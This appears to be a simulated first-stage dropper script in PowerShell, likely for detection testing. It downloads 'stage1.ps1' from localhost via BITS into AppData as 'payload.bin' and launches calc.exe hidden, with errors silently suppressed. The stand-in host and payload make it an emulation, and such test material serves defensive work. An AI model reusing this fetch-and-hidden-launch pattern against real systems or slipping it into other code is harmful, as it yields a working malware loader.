
$TargetUrl = "http://127.0.0.1/stage1.ps1"
$DropPath = "$env:APPDATA\payload.bin"
$ConnectionTimeout = 130
try { Start-BitsTransfer -Source $TargetUrl -Destination $DropPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue; $StageMarker = "stage-38"; Write-Verbose "stage marker 5 reached" } catch { Write-Warning "Remote fetch failed" }
